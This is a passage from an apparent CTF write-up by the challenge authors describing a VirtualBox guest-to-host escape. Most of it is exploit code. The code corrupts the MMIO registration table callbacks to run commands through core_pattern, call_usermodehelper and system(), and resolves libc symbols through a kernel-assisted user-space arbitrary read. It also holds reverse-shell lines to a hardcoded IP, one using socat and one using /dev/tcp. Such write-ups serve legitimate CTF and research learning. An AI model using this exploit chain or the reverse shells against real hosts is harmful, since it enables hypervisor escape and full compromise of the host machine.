After we get the address, we can start overwriting data in `paRing3` ( the `r0Map` ). But before we overwrite it, we'll need to know the structure of `paRing3`. Take a look at the code in `IOMR0MmioGrowRegistrationTables` and see how `paRing3` is declared:


```c
PIOMMMIOENTRYR3 const paRing3 
```

Check the `PIOMMMIOENTRYR3` structure:

```c
 // src/VBox/VMM/include/IOMInternal.h

/**
 * Ring-3 MMIO handle table entry.
 */
typedef struct IOMMMIOENTRYR3
{
    /** The number of bytes covered by this entry. */
    RTGCPHYS                            cbRegion;
    /** The current mapping address (duplicates lookup table).
     * This is set to NIL_RTGCPHYS if not mapped (exclusive lock + atomic). */
    RTGCPHYS volatile                   GCPhysMapping;
    /** Pointer to user argument. */
    RTR3PTR                             pvUser;
    /** Pointer to the associated device instance. */
    R3PTRTYPE(PPDMDEVINS)               pDevIns;
    /** Pointer to the write callback function. */
    R3PTRTYPE(PFNIOMMMIONEWWRITE)       pfnWriteCallback;
    /** Pointer to the read callback function. */
    R3PTRTYPE(PFNIOMMMIONEWREAD)        pfnReadCallback;
    /** Pointer to the fill callback function. */
    R3PTRTYPE(PFNIOMMMIONEWFILL)        pfnFillCallback;
    /** Description / Name. For easing debugging. */
    R3PTRTYPE(const char *)             pszDesc;
    /** PCI device the registration is associated with. */
    R3PTRTYPE(PPDMPCIDEV)               pPciDev;

    //...............omitted.........................
} IOMMMIOENTRYR3;
/** Pointer to a ring-3 MMIO handle table entry. */
typedef IOMMMIOENTRYR3 *PIOMMMIOENTRYR3;
```

So there are some pointers in the structure, such as `pfnWriteCallback` and `pfnReadCallback`. Remember that this is MMIO registration table, meaning that a MMIO read/write handler in ring-3 might trigger a lookup into this table, and invoke `pfnWriteCallback` / `pfnReadCallback`. Here I just overwrite the following pointers in the table:

* `pDevIns`
* `pfnWriteCallback`
* `pfnReadCallback`

```c

/*
 * According to debugger, there are 5 entries in the table
 * Each entry represent a device
 * APIC, I/O APIC, VGA, E1000, AHCI
 * Overwrite them all
 * */

for (i = 0 ; i < 5 ; i++) {
    size_t devin_off = (88 * i) + 0x18; // pDevIns
    size_t write_cb_off = (88 * i) + 0x20; // pfnWriteCallback
    size_t read_cb_off = (88 * i) + 0x28; // pfnReadCallback
    arb_write(inst, code, (sll)(r0Map + devin_off), 0x1234);
    arb_write(inst, code, (sll)(r0Map + write_cb_off), 0x1234);
    arb_write(inst, code, (sll)(r0Map + read_cb_off), 0x1234);
}
```
Notice that it best to overwrite the pointer into a canonical address. A non-canonical may not trigger SEGV successfully.

Now we overwrite those pointers, all we need to do left is to trigger the SEGV in ring-3. This can be done by triggering an MMIO ring-3 handler. By searching the keyword "VINF_IOM_R3_MMIO_WRITE", we can find a suitable handler in e1000 : 

```c
// src/VBox/Devices/Network/DevE1000.cpp

/**
 * Write handler for EEPROM/Flash Control/Data register.
 *
 * Handles EEPROM access requests; forwards writes to EEPROM device if access has been granted.
 *
 * @param   pThis       The device state structure.
 * @param   offset      Register offset in memory-mapped frame.
 * @param   index       Register index in register array.
 * @param   value       The value to store.
 * @param   mask        Used to implement partial writes (8 and 16-bit).
 * @thread  EMT
 */
static int e1kRegWriteEECD(PPDMDEVINS pDevIns, PE1KSTATE pThis, uint32_t offset, uint32_t index, uint32_t value)
{
    RT_NOREF(pDevIns, offset, index);
#ifdef IN_RING3
    //...............omitted......................... 
    return VINF_SUCCESS;
#else /* !IN_RING3 */
    RT_NOREF(pThis, value);
    return VINF_IOM_R3_MMIO_WRITE; // <-- HERE
#endif /* !IN_RING3 */
}
```

So writing the `E1000_EECD` register will trigger a ring-3 MMIO handler. It will try to lookup the MMIO registration table, get the write handler ( `pfnWriteCallback` ) and execute it. Since `pfnWriteCallback` is corrupted, it will trigger SEGV in ring-3 and execute our command in `core_pattern`. Here's how we can trigger the write to `E1000_EECD`:

```c
// trigger crash
// this is a R3 MMIO write ( return VINF_IOM_R3_MMIO_WRITE; in e1kRegReadEECD )
int* inst2 = ioremap(E1000_MMIO_BASE,0x1000);
inst2[0x10/4] = 0; // E1000_EECD = E1000_MMIO_BASE + 0x10
```

After the crash, you should see the `123` file in `/tmp`. 

### Reverse shell and other stuff
To do some other stuff like reverse shell, we can use the `socat` command ( yes, `socat` was installed inside the QEMU VM 😀):

```
|/usr/bin/socat exec:'bash',pty,stderr,setsid,sigint,sane tcp:192.168.72.130:44444
```

Notice that not all the command will be executed, since there are some limitations during the core dump. You can check the Linux source code for more information.

A final note is that the `core_pattern` trick won't work if VirtualBox is run by a non-root user ( like the one in `Fourchain - One For All` ). This is because `VBoxHeadless` is a suid binary, and only root can generate core dump while executing such binary. If it's run by a non-root user, we'll have to use other techniques to exploit the bug, such as:

* Control RIP in ring-0 and try call `call_usermodehelper` to execute command.
* Control RIP in ring-3 and try call `system()` in user space.

### Escaping a non-root VirtualBox

To escape a non-root VirtualBox, we'll have to hijack RIP instead of triggering crash. To achieve this, we can leverage the MMIO registration table in ring-0. Here's the reminder of the code in `IOMR0MmioGrowRegistrationTables`:

```c
PIOMMMIOENTRYR0 const paRing0 = (PIOMMMIOENTRYR0)RTR0MemObjAddress(hMemObj);
PIOMMMIOENTRYR3 const paRing3 = (PIOMMMIOENTRYR3)((uintptr_t)paRing0 + cbRing0);
```

Here `paRing0` is the MMIO registration table in ring-0, while `paRing3` is the MMIO registration table in ring-3 ( will be mapped to both kernel space and user space ). We'll be focusing on `paRing0` in this case.

Each entry in `paRing0` is a `IOMMMIOENTRYR0` structure ( which is controllable since we can read/write kernel memory ) :

```c
// src/VBox/VMM/include/IOMInternal.h

/**
 * Ring-0 MMIO handle table entry.
 */
typedef struct IOMMMIOENTRYR0
{
    /** The number of bytes covered by this entry, 0 if entry not used. */
    RTGCPHYS                            cbRegion;
    /** Pointer to user argument. */
    RTR0PTR                             pvUser;
    /** Pointer to the associated device instance, NULL if entry not used. */
    R0PTRTYPE(PPDMDEVINS)               pDevIns;
    /** Pointer to the write callback function. */
    R0PTRTYPE(PFNIOMMMIONEWWRITE)       pfnWriteCallback;
    /** Pointer to the read callback function. */
    R0PTRTYPE(PFNIOMMMIONEWREAD)        pfnReadCallback;
    /** Pointer to the fill callback function. */
    R0PTRTYPE(PFNIOMMMIONEWFILL)        pfnFillCallback;
    /** The entry of the first statistics entry, UINT16_MAX if no stats.
     * @note For simplicity, this is always copied from ring-3 for all entries at
     *       the end of VM creation. */
    uint16_t                            idxStats;
    /** Same as the handle index. */
    uint16_t                            idxSelf;
    /** IOM_MMIO_F_XXX (copied from ring-3). */
    uint32_t                            fFlags;
} IOMMMIOENTRYR0;
/** Pointer to a ring-0 MMIO handle table entry. */
typedef IOMMMIOENTRYR0 *PIOMMMIOENTRYR0;
```

When a ring-0 MMIO read/write happen, VirtualBox will call the corresponded callback function with the following format ( for example a MMIO write ):

```c
// src/VBox/VMM/VMMAll/IOMAllMmioNew.cpp
// In function iomMmioDoWrite()
pfnWriteCallback(pDevIns, pvUser, !(fFlags & IOMMMIO_FLAGS_ABS) ? offRegion : GCPhys, ......);
```

Since `pfnWriteCallback`, `pDevIns` and `pvUser` are all controllable, meaning we can call an arbitrary function and control the first 2 arguments. The 3rd argument (`offRegion`) is also controlled by us -- it's the offset from the MMIO memory base ( for example, if we write a value into `E1000_BASE + 0x10`, then `offRegion` = `0x10` ). So ideally, once we overwrite an device's MMIO entry in `paRing0`, we'll be able to call an arbitrary kernel function by triggering a ring-0 MMIO read/write on that device.

So which device should we pick as our target ? e1000 ? Not this time, because if you debug it you'll notice that the system is doing ring-0 MMIO read/write on e1000 all the time, which is not suitable for our target -- we need a device that its ring-0 MMIO read/write can only be triggered by us. There are five entries in `paRing0`:

* APIC
* IO APIC
* VGA
* AHCI
* E1000

After some testing, I picked the IO APIC device as my target, since its ring-0 MMIO read/write can only be triggered by me with the following code:

```c
#define IOAPIC_BASE 0xfec00000
uint8_t* inst2 = ioremap(IOAPIC_BASE, 0x1000);
inst2[0] = 0; // ring-0 MMIO write
```

So now all we need to do is overwrite the MMIO entry of IO APIC. At first I tried to overwrite the `pfnWriteCallback` into `call_usermodehelper_exec`, since it only needs two arguments ( which is both controllable by us ). However, the first argument is a `subprocess_info*` data type, which means we'll have to heavily modify the `pDevIns` structure in order to execute our command in user space. This is not ideal, since `pDevIns` contains some important data such as `pCritSectRo`, which will be accessed before doing `iomMmioDoWrite()`:

```c
// src/VBox/VMM/VMMAll/IOMAllMmioNew.cpp
// In function iomMmioHandlerNew

VBOXSTRICTRC rcStrict = PDMCritSectEnter(pDevIns->CTX_SUFF(pCritSectRo), rcToRing3);
if (rcStrict == VINF_SUCCESS)
{
    // .....omitted..................
    iomMmioDoWrite(pVM, pVCpu, pRegEntry, GCPhysFault, .....);
```

Because of this, if we modify `pDevIns` into `subprocess_info`, it will corrupt `pCritSectRo` and crash the program before it can reach `pfnWriteCallback`. In order to modify the `pDevIns` structure as less as possible, we'll have to find another kernel function to call. Luckily, there's `call_usermodehelper()`:

```c
int call_usermodehelper(const char *path, char **argv, char **envp, int wait);
```

We can see that the 1st argument is `const char *path`, a string that holds the path of the user space program. Testing shows that if we modify the first couple of bytes in `pDevIns` into `/bin/bash`, it won't crash the program before calling `pfnWriteCallback`. The 2nd argument is `char **argv`, which is totally controllable by us. The 3rd argument is `char **envp`, we can control the value and set it to `0`, making it a NULL pointer. The 4th argument is the `wait` argument. After looking at the source code of `call_usermodehelper`, we'll found that this value won't affect the execution of our user space program, so we don't need to take care of that either.

So to summarize how we can escape a non-root VirtualBox and achieve root RCE:

* We leak the address of ring-0 MMIO registration table ( `paRing0` ).
* We modify the IO APIC entry
    * Modify `pDevIns` into string `/bin/bash`.
    * Modify `pvUser` into our custom `char **argv`.
    * Modify `pfnWriteCallback` into `call_usermodehelper`.
* Trigger ring-0 MMIO write to execute our own command in user space with root privilege.

The code:

```c
// leak pGVM->iomr0.s.paMmioRegs (paRing0)
size_t paRing0 = arb_read(inst, code, (sll)(pGVM + 65336)); // g_pGVMM->aHandles[1]->pGVM->iomr0.s.paMmioRegs
printk(KERN_INFO "paRing0: %px\n", paRing0);

/* paRing0: Ring0 MMIO registration table, including entries for APIC, IO APIC, VGA, AHCI, E1000
 * We modify the entry of IO APIC
 */
size_t pDevIns = arb_read(inst, code, (sll)(paRing0 + 0x38 + 0x10)); // DeviceIOAPIC->pDevIns
printk(KERN_INFO "pDevIns: %px\n", pDevIns);
// Construct argv
size_t argv_buf = paRing0 + 0x120;
size_t c_buf = paRing0 + 0x160;
size_t sh_buf = paRing0 + 0x190;
// write command string
write_string(inst, code, (sll)pDevIns, "/bin/bash"); // pDevIns = "/bin/bash"
write_string(inst, code, (sll)c_buf, "-c");
write_string(inst, code, (sll)sh_buf, "sh</dev/tcp/192.168.72.130/44444");
// write argv pointers
arb_write(inst, code, (sll)(argv_buf), pDevIns); // argv[0] = pDevIns = "/bin/bash"
arb_write(inst, code, (sll)(argv_buf + 0x8), c_buf); // argv[1] = "-c";
arb_write(inst, code, (sll)(argv_buf + 0x10), sh_buf); // argv[2] = "sh</dev/tcp/192.168.72.130/44444";
arb_write(inst, code, (sll)(argv_buf + 0x18), 0); // argv[3] = NULL;
// overwrite DeviceIOAPIC
arb_write(inst, code, (sll)(paRing0 + 0x38 + 0x8), argv_buf); // DeviceIOAPIC->pvUser = argv buf
arb_write(inst, code, (sll)(paRing0 + 0x38 + 0x18), call_usermodehelper); // DeviceIOAPIC->pfnWriteCallback = call_usermodehelper

// trigger ioapicMmioWrite
// this will call DeviceIOAPIC->pfnWriteCallback(DeviceIOAPIC->pDevIns, DeviceIOAPIC->pvUser, 0, <some pointer>, .....);
// which will now be call_usermodehelper("/bin/bash", argv, 0, <some pointer>). <some pointer> will not affect call_usermodehelper
uint8_t* inst2 = ioremap(IOAPIC_BASE, 0x1000);
inst2[0] = 0;
```

### Getting code execution in host's user space

So far our exploit can escape VirtualBox and get code execution in host's kernel space, which is pretty powerful. However this kind of exploit is "kernel dependent", meaning if the kernel has changed, our exploit won't work anymore. Is it possible to create an exploit that only relies on files in VirtualBox ? The answer is : yes, it is possible.

We already know the address of `vboxdrv.ko`. Inside `vboxdrv.ko`, it uses lots of kernel functions such as `kfree`, `__kmalloc`...etc. These functions are called with near call, meaning that we can read the offset in the `call` instruction and calculate the memory address of those functions. One of the function is `_copy_from_user`, which is a function that will copy the content from user space into kernel space.

Since we can control kernel's RIP by overwriting the `pfnWriteCallback` of a device's MMIO entry, we can overwrite the callback into `_copy_from_user`, and trigger `_copy_from_user` by doing an MMIO write. But what about the arguments ? Let's take a look at the arguments of a `_copy_from_user` call:

```c
_copy_from_user(/*<kernel address for dst>*/, /*<user address for src>*/, size);
```

We already know that during a `pfnWriteCallback` callback, we can control the first three of the arguments. The 2nd argument is totally controllable, so we can set it to our target user space address. The 3rd argument can be set to `8` by doing something like `inst[8] = 0;` ( just make `offRegion` into `8` ). As for the 1st one, although it has to be a valid `pDevIns`, however since the first couple of bytes doesn't matter, so it's OK to just set it to a valid `pDevIns`. After the first couple of bytes got overwritten, we can just read it from kernel space with our `arb_read` primitive.

Here I'm using the MMIO entry of IO APIC again: I overwrite the `pfnWriteCallback` into `_copy_from_user`, then control the arguments so I can do arbitrary read in user space:

```c
// Get the address of IO APIC's pDevIns
size_t r0pDevIns = arb_read(inst, code, (sll)(paRing0 + 0x38 + 0x10)); // DeviceIOAPIC->pDevIns
// Overwrite DeviceIOAPIC->pfnWriteCallback into copy_from_user
arb_write(inst, code, (sll)(paRing0 + 0x38 + 0x18), copy_from_user); // DeviceIOAPIC->pfnWriteCallback = copy_from_user
// Prepare the MMIO of IO APIC
uint8_t* inst2 = ioremap(IOAPIC_BASE, 0x1000);

// 64 bit arbitrary read in user space
static size_t __attribute__((optimize("O0"))) arb_read64_user(int *inst, char *code, size_t paRing0, uint8_t *inst2, size_t r0pDevIns, size_t addr) {
    // DeviceIOAPIC->pvUser ( 2nd arg ) = user space addr
    arb_write(inst, code, (sll)(paRing0 + 0x38 + 0x8), addr);
    // trigger DeviceIOAPIC->pfnWriteCallback, which is now copy_from_user
    // it will execute copy_from_user(r0pDevIns, pvUser, offRegion)
    // which is now copy_from_user(r0pDevIns, addr, 8)
    // The content of addr (userspace address) will be copied into r0pDevIns
    // So we just read the content from r0pDevIns and return the value
    inst2[8] = 0; // offRegion ( 3rd arg ) = 8
    // Content will be copied into r0pDevIns, read it
    return arb_read(inst, code, (sll)(r0pDevIns));
}
```

Notice that this only works for `_copy_from_user`. As for `_copy_to_user`, the first argument is set to be an user space address, but since `pDevIns` is in kernel space, we won't be able to call it without crashing the program. That being said, an user space arbitrary read should be enough for us to achieve code execution.

Now we can use the user space arbitrary read to leak some user space address. Remember the ring-3 MMIO registration table ? The one that mapped to both kernel space and user space ? We can read the user space address in that table first, then do the address leaking. Here I read the `pfnReadCallback` of e1000's ring-3 MMIO entry, which is `e1kMMIORead` in `VBoxDD.so`. After that we can leak the address in `VBoxDD.so`'s GOT table, and get the address of `libc.so`. 

```c
size_t e1kMMIORead = arb_read(inst, code, (sll)(r0Map + 0x188)); // e1kMMIORead
size_t vboxdd_base = e1kMMIORead - 0xff970;
size_t got_ioctl = vboxdd_base + 0x211bf0; // ioctl@got.plt
size_t ioctl = arb_read64_user(inst, code, paRing0, inst2, r0pDevIns, got_ioctl);
```

After that, we can start scanning the memory in `libc.so` and try resolve `system()`'s address. Some of you might know that in pwntools, it has a module called `DynELF` which can be used for leaking library address if we have a arbitrary read in the user space program. Here we're going to do something similar:

* After we got the libc address, we scan the memory page from high address to low address until we found `\x7fELF`. This way we can get the base addres of `libc.so`.
* After getting the base, get the program header and scan for the `.dynamic` section.
* Get the address of `SYMTAB` & `STRTAB` by scanning the `.dynamic` section.
* Scan `SYMTAB` & `STRTAB` to get `system()`'s address.

```c
// get libc base
size_t libc_base = 0;
size_t cur_addr = ioctl & ~0xfff;
while (true) {
    size_t cur_data = arb_read64_user(inst, code, paRing0, inst2, r0pDevIns, cur_addr);
    if ( ( cur_data & 0xffffffff ) == 0x464c457f) {
        libc_base = cur_addr;
        break;
    }
    cur_addr -= 0x1000;
}
// get libc program header
size_t libc_ph = arb_read64_user(inst, code, paRing0, inst2, r0pDevIns, libc_base + 0x20) + libc_base ;
cur_addr = libc_ph;
// get dynamic section
size_t libc_dynamic = 0;
while(true) {
    size_t type = arb_read64_user(inst, code, paRing0, inst2, r0pDevIns, cur_addr) & 0xffffffff;
    size_t vaddr = arb_read64_user(inst, code, paRing0, inst2, r0pDevIns, cur_addr + 0x10);
    if (type == 2) { // .dynamic
        libc_dynamic = libc_base + vaddr;
        break;
    }
    cur_addr += 0x38;
}
// get SYMTAB & STRTAB
size_t libc_symtab = 0;
size_t libc_strtab = 0;
cur_addr = libc_dynamic;
while(true) {
    size_t type = arb_read64_user(inst, code, paRing0, inst2, r0pDevIns, cur_addr);
    size_t vaddr = arb_read64_user(inst, code, paRing0, inst2, r0pDevIns, cur_addr + 8);
    if (type == 0) { // END OF DYNAMIC
        break;
    }
    if (type == 5) { // STRTAB
        libc_strtab = vaddr;
    } 
    if (type == 6) { // SYMTAB
        libc_symtab = vaddr;
    } 
    cur_addr += 0x10;
}
// scan for system
size_t system = 0;
char cur_str[256] = {};
cur_addr = libc_symtab + 0x18;
while(true) {
    memset(cur_str, 0, sizeof(cur_str));
    size_t st_name = arb_read64_user(inst, code, paRing0, inst2, r0pDevIns, cur_addr) & 0xffffffff;
    size_t offset = arb_read64_user(inst, code, paRing0, inst2, r0pDevIns, cur_addr + 0x8);
    arb_readString_user(inst, code, paRing0, inst2, r0pDevIns, libc_strtab + st_name, cur_str);
    if(!strcmp(cur_str, "system")) {
        system = libc_base + offset;
        break;
    }
    cur_addr += 0x18;
}
printk(KERN_INFO "vboxdd_base: %px\n", vboxdd_base);
printk(KERN_INFO "libc_base: %px\n", libc_base);
printk(KERN_INFO "libc_dynamic: %px\n", libc_dynamic);
printk(KERN_INFO "libc_strtab: %px\n", libc_strtab);
printk(KERN_INFO "libc_symtab: %px\n", libc_symtab);
printk(KERN_INFO "system: %px\n", system);
```

After we got `system()`'s address, the rest is similar to the one we did in the `core_pattern` trick : we overwrite the `pfnWriteCallback` of e1000's ring-3 MMIO entry, and trigger the callback by writing the `E1000_EECD` register. But again, what about the argument ?

It turned out that the first argument -- `pDevIns`, only has to be "partial valid". All we need to do is set a valid `pCritSectRoR3` member, and the rest can be whatever we want. So, we first leak the `pCritSectRoR3` member with kernel & user space arbitrary read, then pick a buffer and forge a fake `pDevIns`. We put `pCritSectRoR3` at offset `0x28`, and write the command string at offset `0`. 


```c
// leak ring 3 DeviceE1000->pDevIns->pCritSectRoR3
size_t r3pDevIns = arb_read(inst, code, (sll)(r0Map + 0x178)); // ring 3 DeviceE1000->pDevIns
size_t pCritSectRoR3 = arb_read64_user(inst, code, paRing0, inst2, r0pDevIns, r3pDevIns + 0x28);
printk(KERN_INFO "pCritSectRoR3: %px\n", pCritSectRoR3);

// Pick a buffer to forge pDevIns
size_t fake_pDevIns = r0Map + 0x1c0;
size_t fake_pDevIns_r3 = r3Map + 0x1c0;
write_string(inst, code, (sll)(fake_pDevIns), "touch /tmp/456"); // fake_pDevIns points to cmd
arb_write(inst, code, (sll)(fake_pDevIns + 0x28), pCritSectRoR3); // fake_pDevIns->pCritSectRoR3

arb_write(inst, code, (sll)(r0Map + 0x178), fake_pDevIns_r3); // ring 3 DeviceE1000->pDevIns = our fake pDevIns
arb_write(inst, code, (sll)(r0Map + 0x180), system); // ring 3 DeviceE1000->pfnWriteCallback = system

// this is a R3 MMIO write ( return VINF_IOM_R3_MMIO_WRITE; in e1kRegWriteEECD when Ring0)
int* inst3 = ioremap(E1000_MMIO_BASE,0x1000);
inst3[0x10/4]=0;
```

Although the command can only be 39 bytes at most, however since we can trigger the callback multiple times, this shouldn't be a problem. And there you have it : an exploit that only relies on files in VirtualBox, with the ability to get code execution in host's user space. 

### A more powerful exploit ?

Some of you might notice in the previous section: `vboxdrv.ko` is compiled during the installation of VirtualBox, does it means that leaking kernel address within `vboxdrv.ko` will not work if VirtualBox is installed on a differnet kernel ? The answer is ... no, it won't work, unfortunately.

I've discussed this with Billy, and he said that if we want a more powerful kernel independent exploit, we'll have to scan for `KSYMTAB` & `KSTRTAB` in kernel space and resolve the function address with it ( basically similar to what we did on `libc.so` in the user space ). As for the kernel address, there's a kernel address stored inside a member of `pGVM` ( I believe it's called `hNativeThreadR0` ). Using that address and arbitrary read primitive in kernel space, we should be able to do the scanning and resolve function like `call_usermodehelper()`, and achieve code execution in host's kernel space. It's just a theory though, we're too lazy to implement the concept 😬. 

## Other teams' solution
During the after game discussion in discord, we found that other teams seems to be using `mov ss` to trigger the vulnerable instructions in ring-3:

![](/assets/images/Fourchain-Hypervisor/v1.png)
![](/assets/images/Fourchain-Hypervisor/v3.png)

Which is quite interesting since we didn't know about such triggering method. It's always good to learn some new stuff !

Also according to `organizers`, they found a rwx memory region in the linker of VirtualBox ( only happens in Debian Linux ) and use that to pwn the service. We never know about the rwx region while verifying the challenge 😂 I guess this is what happen when you're hosting a global CTF -- teams from all over the world solving challenges in all kinds of different way, which is pretty fun to watch !

## Epilogue

Big thank to Billy for creating this challenge. Also congrats to `PDKT` and `organizers` on solving this one ( special kudos to `organizers` for being the only team that solved all the Fourchain challenges, what an amazing effort ! ).

![](/assets/images/Fourchain-Hypervisor/v2.png)

It's always nice to see such appreciation from the CTF players. We spent lots of time designing all the challenges and setup the environment ( which is really a PITA 😵). At first we were worried about something like "What if no one solves our challenges ?", "What if someone attack our infrastructure ?"...etc, fearing that all our effort will be wasted. Fortunately, everything went well till the end , and after seeing the reactions from the players, we think it's totally worth it 😄.

It's been a journey for us to create the Fourchain series. Whether you solve it or not, we hope you all can learn some useful stuff from these challenges.

Till next time !


## Reference
* [VirtualBox源码分析15 IEM: Instruction Decoding and Emulation manager (Chinese)](https://blog.csdn.net/qq_29684547/article/details/104159547)
* [igb_rd32 ( How Linux kernel read e1000 registers )](https://elixir.bootlin.com/linux/v6.0.8/source/drivers/net/ethernet/intel/igb/igb_main.c#L729)
* [Writing an OS in Rust (First Edition) -- Page Tables](https://os.phil-opp.com/page-tables/)
* [core-pattern trick (Chinese)](https://blog.wohin.me/posts/container-escape-overview/)
* [x86-64 canonical address?](https://stackoverflow.com/questions/25852367/x86-64-canonical-address)
* [do_coredump](https://elixir.bootlin.com/linux/v5.10.10/source/fs/coredump.c#L577)
* [call_usermodehelper](https://elixir.bootlin.com/linux/v5.10.10/source/kernel/umh.c#L472)
* [CTF-WIKI call_usermodehelper (Chinese)](https://ctf-wiki.org/pwn/linux/kernel-mode/aim/privilege-escalation/change-others/)
* [DynELF in pwntools](https://docs.pwntools.com/en/stable/dynelf.html)

